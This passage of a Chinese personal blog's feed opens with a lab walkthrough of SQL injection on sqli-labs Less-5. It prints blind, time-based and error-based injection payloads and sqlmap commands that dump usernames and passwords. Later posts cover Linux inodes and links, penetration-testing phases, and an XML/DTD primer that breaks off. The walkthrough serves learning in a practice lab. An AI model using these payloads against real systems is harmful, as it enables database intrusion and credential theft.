alt="85bLBq.png"></p><p>正常回显，第2个字母为’s’;<br>之后通过更改mid(column_name,start[,length])中的’start’来改变位数，最终得到第4张表名为’users’;</p><p>注：limit子句用于限制查询结果返回的数量，常用于分页查询</p><table><thead><tr><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>select * from tableName limit i,n</code></td><td align="left">i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</td></tr><tr><td align="left"></td><td align="left">n：为查询结果返回的数量</td></tr><tr><td align="left"><code>limit n</code> 等同于`` limit 0,n`</td><td align="left"></td></tr><tr><td align="left">SELECT * FROM table LIMIT 1,10;</td><td align="left">检索记录行2-11;</td></tr></tbody></table><ol start="3"><li><p>爆字段</p><p>判断列名长度：</p><p><code>?id=1&#39; and (select length(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 4,1)=8 --+</code><br>得到第5列，列名长度为8；<br><code>?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),1,8)=&#39;password&#39; --+</code></p></li></ol><p><img src="https://s1.ax1x.com/2020/03/29/GEhH7d.png" alt="GEhH7d.png"></p><p>根据长度，猜测列名为<code>password</code>，验证得到正常返回；</p><p>+++</p><p><font color="#ff000" face="黑体" size="4">问题：在这里password是在第5列，而通过SQLMap检测，只有3列，且出现了如下不应存在的首列”user”;</font></p><p>  <code>?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,4)=&#39;user&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/22/85bT3Q.png" alt="85bT3Q.png"></p><p>得到第1列为’user’;</p><p>并且查看<code>users</code>表，发现共有13条记录；</p><p><img src="https://s1.ax1x.com/2020/03/29/GEh70H.png" alt="GEh70H.png"></p><p>+++</p><ol start="4"><li>爆内容</li></ol><ul><li>判断长度</li></ul><p><code>?id=1&#39; and (select length(password) from users limit 0,1)=4 --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhTne.png" alt="GEhTne.png"></p><p>得到’password’中第一条记录长度为4；</p><p>对比：order by id</p><p><code>?id=1&#39; and (select length(password) from users order by id limit 0,1)=4 --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhj9P.png" alt="GEhj9P.png"></p><p>说明内容顺序应该是固定的而不是以关系链接的；</p><ul><li>逐一测试内容</li></ul><p><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;d&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhIXD.png" alt="GEhIXD.png"></p><p>得到首字母为d；</p><p><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhqAA.png" alt="GEhqAA.png"></p><p>说明MySQL对大小写不敏感，不能区分是’d’还是’D’;</p><p><code>?id=1&#39; and mid((select password from users order by id limit 0,1),1,1)=&#39;d&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhLtI.png" alt="GEhLtI.png"></p><p><code>?id=1&#39; and mid((select password from users order by id limit 0,1),2,1)=&#39;u&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhOht.png" alt="GEhOht.png"></p><p>……</p><p>得到该用户的密码为”dumb”(大小写不定);</p><p>同理，可通过如上方法得到对应用户名。从而得到用户名-密码；</p><p><code>?id=1&#39; and mid((select password from users order by id limit 1,1),1,1)=&#39;i&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/29/GEhxc8.png" alt="GEhxc8.png"></p><p>通过改变limit参数修改所查询的记录；</p><p>+++</p><h3 id="方法2：SQLMap"><a href="#方法2：SQLMap" class="headerlink" title="方法2：SQLMap"></a>方法2：SQLMap</h3><p>盲注步骤：</p><ol><li>检测<br><code>python sqlmap.py -u &quot;URL?id=1&quot;</code></li></ol><p><img src="https://s1.ax1x.com/2020/03/15/833zP1.png" alt="833zP1.png"><br>可以看到，SQLMap使用了三种类型的注入方法：</p><ul><li><p>Type: boolean-based blind</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">Payload: id=1' AND 7804=7804 AND 'Fgyq'='Fgyq</span><br></pre></td></tr></table></figure></li><li><p>Type: error-based</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">Payload: id=1' AND (<span class="keyword">SELECT</span> <span class="number">6181</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x716b7a7171</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>(<span class="number">6181</span>=<span class="number">6181</span>,<span class="number">1</span>))),<span class="number">0x7176626271</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'WtBf'</span>=<span class="string">'WtBf</span></span><br></pre></td></tr></table></figure></li><li><p>Type: time-based blind</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">Payload: id=1' AND (<span class="keyword">SELECT</span> <span class="number">4715</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">5</span>)))dSPj) <span class="keyword">AND</span> <span class="string">'POnp'</span>=<span class="string">'POnp</span></span><br></pre></td></tr></table></figure></li></ul><p>初步检测得到DBMS为MySQL，且后端版本不在5.0版本之下；</p><ol start="2"><li>爆数据库名<br><code>python sqlmap.py -u &quot;URL?id=1&quot; --dbs</code></li></ol><p><img src="https://s1.ax1x.com/2020/03/15/838S8x.png" alt="838S8x.png"><br>得到如上8个数据库；</p><ol start="3"><li>爆表名<br><code>python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; --tables</code><br>以“security”为例：</li></ol><p><img src="https://s1.ax1x.com/2020/03/15/833XVJ.png" alt="833XVJ.png"><br>得到4 tables；</p><ol start="4"><li>爆字段<br><code>python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot;  --columns</code></li></ol><p><img src="https://s1.ax1x.com/2020/03/15/838AVH.png" alt="838AVH.png"><br>得到3 columns；</p><ol start="5"><li>爆内容<br><code>python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot; -C &quot;id,username,password&quot; --dump</code></li></ol><p><img src="https://s1.ax1x.com/2020/03/15/83Bevd.png" alt="83Bevd.png"><br>得到13 entries；<br>+++</p><h3 id="方法3：时间延迟注入-time-based-blind"><a href="#方法3：时间延迟注入-time-based-blind" class="headerlink" title="方法3：时间延迟注入(time-based blind)"></a>方法3：时间延迟注入(time-based blind)</h3><p><strong>正确延迟，错误不延时；</strong></p><ol><li>爆库</li></ol><ul><li>库长</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/29/GEhv1f.png" alt="GEhv1f.png"></p><p>根据浏览器刷新的延迟程度，可以判断库长为8；</p><ul><li>库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),2)='se',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>爆表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'e'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>第一个表首字母为’e’;</p><ol start="3"><li>爆字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="4"><li>爆内容</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'d'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>……</p><p>由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述；</p><h3 id="方法4：报错注入-error-based"><a href="#方法4：报错注入-error-based" class="headerlink" title="方法4：报错注入(error-based)"></a>方法4：报错注入(error-based)</h3><p>补充：</p><p>常用函数</p><table><thead><tr><th align="left">函数语法</th><th>解释</th><th>用法</th></tr></thead><tbody><tr><td align="left"><code>CONCAT( string1, string2 )</code></td><td>CONCAT函数返回string1连接string2后的一个字符串值。如果有任何一个参数为null，则返回值为null；</td><td><code>SELECT CONCAT(CONCAT(&#39;A&#39;, &#39;B&#39;),&#39;C&#39;) FROM dual;</code>– Result: ‘ABC’<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">| `FLOOR(x)`                   | 返回小于等于输入的数的整数;                                  | `SELECT floor(3.1415926);`--Result: 3                        |</span><br><span class="line">| `RAND()`                     | 产生0和1之间的一个随机数；                                   | `RAND();`--Result: 0.1824410643265                           |</span><br><span class="line">| `COUNT(expression)`          | 用于检索表达式或给定列的行数;                                | `SELECT COUNT(aggregate_expression)   FROM tables   [WHERE conditions];` |</span><br><span class="line">| `GROUP BY`                   | 协作 SELECT语句相同的数据成组以便安排;                       | `SELECT column-list FROM table_name WHERE [ conditions ] GROUP BY column1, column2....columnN ORDER BY column1, column2....columnN` |</span><br><span class="line"></span><br><span class="line">+++</span><br><span class="line"></span><br><span class="line">**使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。**</span><br><span class="line"></span><br><span class="line">构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。</span><br><span class="line"></span><br><span class="line">1. 查看版本信息</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=-1&apos;union select count(*),count(*), concat(&apos;~&apos;,(select version()),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure></td></tr></tbody></table><p><img src="https://s1.ax1x.com/2020/03/29/GZSoan.png" alt="GZSoan.png"></p><p>注：加入’~’是为了明显区分查询内容，防止加入其他连接进的字符串；</p><ol start="2"><li>爆库</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/29/GZSHP0.png" alt="GZSHP0.png"></p><ol start="3"><li>爆用户</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">'~'</span>, <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/29/GZSbGV.png" alt="GZSbGV.png"></p><ol start="4"><li>爆表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">1</span>, <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/29/GZSq2T.png" alt="GZSq2T.png"></p><p>通过修改limit x,1 遍历表名;</p><p><img src="https://s1.ax1x.com/2020/03/29/GZST5q.png" alt="GZST5q.png"></p><ol start="5"><li>爆字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/29/GZSLxU.png" alt="GZSLxU.png"></p><ol start="6"><li>爆内容</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">':'</span>,<span class="keyword">password</span>,username) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="string">'~'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>修改limit x,1 以更改爆出第x个用户的password和username （‘[’是分隔符）；</p><p>注：</p><table><thead><tr><th>concat()</th><th>连接字符串的时候，只要其中一个是NULL，那么将返回NULL</th></tr></thead><tbody><tr><td>concat_ws()</td><td>连接字符串的时候，只要有一个字符串不是NULL，就不会返回NULL。(concat_ws函数需要指定分隔符)</td></tr></tbody></table><p><img src="https://s1.ax1x.com/2020/03/29/GZSXMF.png" alt="GZSXMF.png"></p><center>END<center></center></center>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Less-5-GET方式-双注入-单引号-string型&quot;&gt;&lt;a href=&quot;#Less-5-GET方式-双注入-单引号-string型&quot; class=&quot;headerlink&quot; title=&quot;Less-5(GET方式-双注入-单引号-st
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Linux 的节点 inode</title>
    <link href="https://singlemindedt.github.io/2020/03/11/2020-03-11-Linux-%E7%9A%84%E8%8A%82%E7%82%B9-inode/"/>
    <id>https://singlemindedt.github.io/2020/03/11/2020-03-11-Linux-的节点-inode/</id>
    <published>2020-03-11T11:29:23.000Z</published>
    <updated>2020-03-12T09:21:51.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WHO"><a href="#WHO" class="headerlink" title="WHO?"></a>WHO?</h1><p>文件数据储存在硬盘中，硬盘最小的储存单元为“扇区”（一个扇区512字节）。<br>操作系统读取硬盘时，为提高读取效率，一次性读取多个扇区，这些扇区组成“块”(即block，是文件存取的最小单位，一般为4KB，即连续8个扇区组成一个block；)<br>文件都储存在“块”中，那么还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。<br>每个存储设备(如硬盘)或存储设备的分区被格式化为文件系统后，有两部分内容，一部分为inode，另一部分为block。block用来存储数据，inode用来存储数据的信息(如文件大小、属性、归属的用户组、读写权限等)。inode为每个文件进行信息索引，因此有了inode的数值。操作系统根据指令，能通过inode值找到相对应的文件。</p><h1 id="Inode内容"><a href="#Inode内容" class="headerlink" title="Inode内容"></a>Inode内容</h1><ul><li>文件的字节数</li><li>文件拥有者的User ID</li><li>文件的Group ID</li><li>文件的读、写、执行权限</li><li>文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</li><li>链接数，即有多少文件名指向这个inode</li><li>文件数据block的位置<br>使用<code>stat 文件名</code>命令，可以查看文件的inode信息：</li></ul><img src="https://s1.ax1x.com/2020/03/12/8eYMTK.png" alt="8eYMTK.png" style="zoom:80%;"><p>这是一个新建的空的txt文本文件；</p><h1 id="Inode大小与数量"><a href="#Inode大小与数量" class="headerlink" title="Inode大小与数量"></a>Inode大小与数量</h1><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域：一个是数据区（data area），存放block；另一个是inode区（也交inode表，inode table），存放inode。<br>inode节点的大小，一般为128B或256B。inode节点的数目，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。<br>使用<code>df -i</code>可以查看每个硬盘分区的inode总数和已经使用的数量：</p><p><img src="https://s1.ax1x.com/2020/03/12/8eYlFO.png" alt="8eYlFO.png"></p><p>注：由于inode是有限个的，而每个文件又有一个inode，因此产生现象：硬盘还未存满，但inode节点已经用光，导致硬盘上无法创建新文件。<br>查看每个inode节点大小，可以使用<code>sudo dumpe2fs -h /dev/hda | grep &quot;Inode size&quot;</code></p><p><img src="https://s1.ax1x.com/2020/03/12/8eYeyR.png" alt="8eYeyR.png"></p><h1 id="Inode-number"><a href="#Inode-number" class="headerlink" title="Inode number"></a>Inode number</h1><p>每个inode都有一个号，类似身份证号，Unix/Linux操作系统内部不使用文件名，而是用inode number来识别文件。文件名只是inode number便于识别的别称或绰号。<br>表面上，用户通过文件名打开文件；<br>实际上，系统内部分三步完成这一过程：</p><ol><li>找到文件名对应的inode number（内存）。</li><li>通过inode number，获取inode内容（磁盘）。</li><li>最后，根据inode内容，找到文件数据存储的所有block，读出数据（磁盘）。<br>使用<code>ls -i</code>命令，可以看到文件名对应的inode number：</li></ol><p><img src="https://s1.ax1x.com/2020/03/12/8eYZl9.png" alt="8eYZl9.png"></p><h1 id="目录文件"><a href="#目录文件" class="headerlink" title="目录文件"></a>目录文件</h1><p>** Linux系统中，一切皆文件。**<br>Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。<br>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所含文件的文件名，以及该文件名对应的inode number。<br><code>ls</code>列出目录文件中的所有文件名：</p><p><img src="https://s1.ax1x.com/2020/03/12/8eYVSJ.png" alt="8eYVSJ.png"></p><p><code>ls -i</code>列出整个目录文件，包括文件名对应的inode number；</p><p><img src="https://s1.ax1x.com/2020/03/12/8eYAW4.png" alt="8eYAW4.png"></p><p><code>ls -l</code>可查看文件的详细信息(即根据inode number，访问inode节点)：</p><p><img src="https://s1.ax1x.com/2020/03/12/8eYFFU.png" alt="8eYFFU.png"></p><p>根据以上内容对目录权限的理解应有以下：</p><ul><li>目录文件的读权限(r)和写权限(w)针对目录文件本身；</li><li>而目录文件中只有文件名和inode number，若是想得到文件的详细信息，就必须经过inode节点，当只有读权限时，用户仅能得到文件名等基本信息，而读取inode索引节点内的信息需要用户拥有目录文件的执行权限(x)。</li></ul><h1 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h1><p>一般情况，文件名和inode number是一一对应的，每个inode number对应一个文件名。但是，Unix/Linux系统允许多个文件名指向同一个inode number。<br>那么就会产生可以通过不同文件名来访问相同文件；对文件内容修改会影响所用相同inode number指向的文件名；删除其中一个文件名不影响其他文件名对文件的访问的情况。即称为<strong>“硬链接”</strong>。</p><p><code>ln 源文件 目标文件</code>命令创建硬链接：<br>[8]:()</p><p><img src="https://s1.ax1x.com/2020/03/12/8eYuex.png" alt="8eYuex.png"></p><p>首列是inode number，第3列表示指向该inode节点的文件名的数量，即链接数。<br>可以看到在创建之前只用两个文件test0.txt和timg.jpeg，并且它们的链接数量均为1；<br>创建后，多出文件test1.txt,且test0.txt和 test1.txt的inode number均为4458874，链接数量也显示为2。<br>注：创建目录时，默认会生成两个目录项：”.”和”..”。“.”的inode number即为当前目录的inode number，相当于当前目录的一个硬链接；“..”的inode number即为当前目录的父目录的inode number，相当于父目录的一个硬链接。故任何一个目录的硬链接总数，总是等于2加上它的子目录总数（含隐藏目录）。</p><h1 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h1><p>软链（soft link，或称符号链接symbolic link）指，如果文件A软链指向文件B，则标记文件A为软链文件，并在文件A中记录文件B的路径。<br>此时，文件A与文件B的inode number号码不同。<br>系统读取文件A时，根据A是软连接会自动将访问者导向文件B，即最终均访问B。<br>相交对于读、修改操作，硬链接与软连接实现的效果相同。但删除（包括rename）操作上表现不同：</p><ul><li>如果删除文件A，则文件B无影响；</li><li>如果删除文件B，则文件A依然存在，但访问文件A时会报错；<br><code>ln -s 源文件 目标文件</code>创建软链接：</li></ul><p><img src="https://s1.ax1x.com/2020/03/12/8eYKw6.png" alt="8eYKw6.png"></p><p>可以看到第4行中test2.txt高亮并有箭头指向test1.txt。软链接test2.txt和源文件test1.txt所拥有的inode number不一样，即软链接是新建了一个文件，而该文件指向源文件，并非源inode 节点。</p><p>参考文献:<br><a href="https://www.linuxidc.com/Linux/2014-09/106457.htm" target="_blank" rel="noopener">1.Linux公社</a><br><a href="https://github.com/xianyunyh/PHP-Interview/blob/master/Linux/inode.md" target="_blank" rel="noopener">2.Blog0</a><br><a href="http://www.opsers.org/base/one-day-the-little-learning-linux-inode-detailed.html" target="_blank" rel="noopener">3.Blog1</a><br><a href="https://baike.baidu.com/item/inode/16194?fr=aladdin" target="_blank" rel="noopener">4.百科</a><br><a href="https://www.ruanyifeng.com/blog/2011/12/inode.html" target="_blank" rel="noopener">5.Blog2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WHO&quot;&gt;&lt;a href=&quot;#WHO&quot; class=&quot;headerlink&quot; title=&quot;WHO?&quot;&gt;&lt;/a&gt;WHO?&lt;/h1&gt;&lt;p&gt;文件数据储存在硬盘中，硬盘最小的储存单元为“扇区”（一个扇区512字节）。&lt;br&gt;操作系统读取硬盘时，为提高读取效率，一次性读取
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="https://singlemindedt.github.io/2020/03/03/2020-03-03-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <id>https://singlemindedt.github.io/2020/03/03/2020-03-03-渗透测试基础/</id>
    <published>2020-03-03T02:15:57.000Z</published>
    <updated>2020-03-03T14:52:44.952Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#ff000" face="黑体" size="4">order  by：</font><br><font color="#000000" face="华文彩云" size="4">@@@</font><br>1.前期交互阶段(确定<font color="#ff0000" face="黑体" size="4">渗透测试的范围和目标</font>)<br>2.情报搜集阶段<font color="#ff000" face="黑体" size="4">40%-60%all time</font></p><ul><li>目标选择</li><li>隐私收集</li><li>踩点工作</li><li>验证目标的安全机制</li></ul><p>3.威胁建模阶段(分析，确定最佳攻击方式，确定安全威胁)<br>4.漏洞分析阶段<br>三种机制：测试、验证、研究；<br>5.渗透攻击阶段&amp;后渗透攻击阶段(客户关心的价值)<br>6.报告阶段<br><a href="https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf" target="_blank" rel="noopener">https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font color=&quot;#ff000&quot; face=&quot;黑体&quot; size=&quot;4&quot;&gt;order  by：&lt;/font&gt;&lt;br&gt;&lt;font color=&quot;#000000&quot; face=&quot;华文彩云&quot; size=&quot;4&quot;&gt;@@@&lt;/font&gt;&lt;br&gt;1.前期交互阶段(确定&lt;font co
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XML &amp; DTD</title>
    <link href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&amp;DTD/"/>
    <id>https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&amp;DTD/</id>
    <published>2020-03-01T02:00:08.000Z</published>
    <updated>2020-04-25T16:32:48.164Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2020/03/02/3fZsUK.jpg" alt="3fZsUK.jpg"></p><h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><ul><li><p>XML 指可扩展标记语言（EXtensible Markup Language）。</p></li><li><p>XML 被设计用来结构化、传输和存储数据。(HTML被设计用于显示数据)</p></li><li><p>XML没有预定义的标签，需自行定义。</p></li><li><p>XML 被设计为具有自我描述性</p><h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>XML文档包含：</p></li><li><input checked disabled type="checkbox"> <p>XML声明</p></li><li><input disabled type="checkbox"> <p>DTD文档类型定义(可选)</p></li><li><input checked disabled type="checkbox"> <p>文档元素</p></li></ul><hr><p>XML文档可看作是一种树结构，由<code>树根</code>—&gt;<code>树叶</code>；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="comment">&lt;!-- 定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>I miss you !<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/01/3cDwMq.png" alt="3cDwMq.png"></p><h1 id="XML元素"><a href="#XML元素" class="headerlink" title="XML元素"></a>XML元素</h1><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。<br>一个元素可以包含：其他元素、文本、属性、或混合前几种元素<br><font color="#ff000" face="黑体" 